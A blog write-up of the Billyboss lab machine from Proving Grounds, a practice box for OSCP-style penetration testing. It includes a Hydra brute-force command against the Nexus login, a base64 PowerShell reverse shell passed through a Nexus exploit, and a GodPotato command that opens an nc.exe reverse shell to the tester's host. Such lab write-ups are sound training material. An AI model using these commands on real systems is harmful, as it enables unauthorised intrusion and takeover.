---
layout: writeup
title: Billyboss - Proving Grounds
date: 2024-08-21 13:32:20 +0300
description: A Writeup of the Billyboss Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Windows, LainKusunagi, Hydra]
---

Here's a writeup for Billyboss, an Intermediate Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). While this box has been rated Intermediate by OffSec, I'll note that the community has rated it to be Very Hard. Terrifying. Let's get started with an nmap scan which shows:

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: BaGet
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8081/tcp  open  http          Jetty 9.4.18.v20190429
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager
|_http-server-header: Nexus/3.21.0-05 (OSS)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

There's a lot to to work with here. It looks like we have two web ports - 80 and 8081 - so I start directory scans for those in the background and check out ports 21 and 445 for low hanging fruit. Unfortunately I can not log into FTP on port 21 with anonymous credentials or blank credentials into SMB for port 445. I also try rpcclient, but I can't get anything there either except the domain name (billyboss). So we'll focus on the web ports for now. 

![Billyboss1.png](/assets/images/Billyboss/Billyboss1.png){: .responsive-image}

Port 80 looks like a package manager called BaGet. I don't see anything interesting in my directory scan, and can't find anywhere to log in or check credentials. I do see that there appears to be some way to upload packages, but I'm not familiar with the .nupkg file type or what I might be able to do with such an upload, and I can't find any noteworthy public exploits, so I pause on that for the time being and move to port 8081. 

![Billyboss2.png](/assets/images/Billyboss/Billyboss2.png){: .responsive-image}

This looks like a repository manager called Sonatype Nexus. We see a sign in page right off the bat. I make a few quick attempts at signing in but nothings. I even find that apparently the default password is `password123`. Oh well. Fortunately we do see that there are some juicy public exploits.

![Billyboss3.png](/assets/images/Billyboss/Billyboss3.png){: .responsive-image}

This one should be pretty good given that it's the same version. Unfortunately it's authenticated, so we'll still need to find a way to sign in. (It suggests admin:password, and we already know that doesn't work). At this point, I keep looking around for a while, but there's really nothing else to try on the other ports, and some quick research on BaGet is still steering me away from the application on port 80. Full disclosure, I had at this point also found some newer exploits for [Sonatype Nexus](https://github.com/Praison001/CVE-2024-4956-Sonatype-Nexus-Repository-Manager)but stayed away from them because they were CVE-2024's, and the box came out in 2020. 

Having recently leared about `cewl`, a wordlist generator, it made sense to give that a shot to try and create user and password lists. I run `cewl --lowercase -m 5 http://192.168.198.61:8081/` and get this output:

```
nexus
repository
manager
loading
image
static
rapture
resources
favicon
product
spinner
browse
history
admin
password
password123
```

I added the last three words based on previous info. At that point, I start Burp and make a request to sign in using admin:password123.

![Billyboss4.png](/assets/images/Billyboss/Billybos4.png){: .responsive-image}

Unfortunately, it looks like the credentials are being base64 encoded, so we'll have to deal with that when we start brute forcing. Apparently that can be done from within the Hydra command by appending 64 to the variables like so: `^USER64^`. Ultimately the full command is:
`hydra -L billyboss.cewl -P billyboss.cewl -s 8081 192.168.198.61 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Incorrect'`

And we get a hit of nexus:nexus.

![Billyboss5.png](/assets/images/Billyboss/Billyboss5.png){: .responsive-image}

*Note: In looking at writeups later on, it is also possible to find nexus:nexus suggested in `seclists` by navigating to the correct directory and using `grep -r 'Sonatype`.* 

So we add this to the previously discovered exploit, and run it. 
![Billyboss6.png](/assets/images/Billyboss/Billyboss6.png){: .responsive-image}

And then after failing to do anything with it, I really you need to change the CMD variable as well. So I change the CMD to `powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAzACIALAA4ADAAOAAx...` a base64 encoded powershell reverse shell generated from [revshells](revshells.com). 

![Billyboss7.png](/assets/images/Billyboss/Billyboss7.png){: .responsive-image}

And we're in. And at first glance, we have some pretty exciting privileges, namely SeImpersonatePrivilege. 

![Billyboss8.png](/assets/images/Billyboss/Billyboss8.png){: .responsive-image}

Unfortunately I can't seem to get any of my potato attacks working, and I also have some trouble downloading and executing the usual enumeration powershell scripts or winpeas. Eventually I get winpeas working though, and I can see a couple of exploits pretty quickly. 

![Billyboss9.png](/assets/images/Billyboss/Billyboss9.png){: .responsive-image}

I also considered that the lab did come out in 2020, so it's certainly possible that these exploits already existed and are part of the intended path. Plus winpeas conveniently includes the github for one of them called [smbghost](https://github.com/danigargu/CVE-2020-0796), so I decide to try that one first. I copy it to the machine and run it. 

![Billyboss10.png](/assets/images/Billyboss/Billyboss10.png){: .responsive-image}

It runs, but it doesn't seem to work. I actually spent a while trying to get variations of this CVE to work, but none of them did, even when I copied them directly from elsewhere. I'm not exactly sure why. At least [one option](https://github.com/Barriuso/SMBGhost_AutomateExploitation) gave the option to inject your own shellcode, but I didn't get this working. I also saw [this video](https://www.youtube.com/watch?v=a0Vf8VLgzhc) which involved editing some of the files and building the exploit, but given that I am working from an ARM machine, this didn't seem practical. 

Ultimately I went back to a Potato attack. `.\GodPotato.exe -cmd "cmd /c nc.exe 192.168.45.183 8081 -e cmd"`

![Billyboss11.png](/assets/images/Billyboss/Billyboss11.png){: .responsive-image}

As you can see, the whoami command doesn't seem to work, but clearly we have Administrator privileges given that we are on the Administrator Desktop and are able to view the proof.txt file. I suspect the reason that my previous attempts with the Potato attacks didn't work because I failed to properly quote the full path of nc.exe or something. In this final case I simply transferred the binary over by itself so there were no issues. 

It's interesting, now that we know what we know regarding the SeImpersonatePrivilege, we could probably have created one script to download GodPotato and nc.exe and even executed it from the initial Sonatype Nexus command without even ever getting a console on the target. 

Lessons learned: To be honest, I've been working on Linux Privesc for the last couple of weeks, so it was a nice refresher to get back into Windows. That said, this box would have gone much faster by simply finding the default credentials faster and being more careful with the Potato attacks. I could have run `grep -r Sonatype /usr/share/seclists` for example to find `nexus:nexus`, and I've added that to my notes. Beyond that, I'm not sure a ton was learned. 

Remediation steps:
1. Change the credentials for the Sonatype Nexus web application
2. Patch the Sonatype Nexus application
3. Disable the `SeImpersonatePrivilege` for the `nathan` user on the Billyboss machinec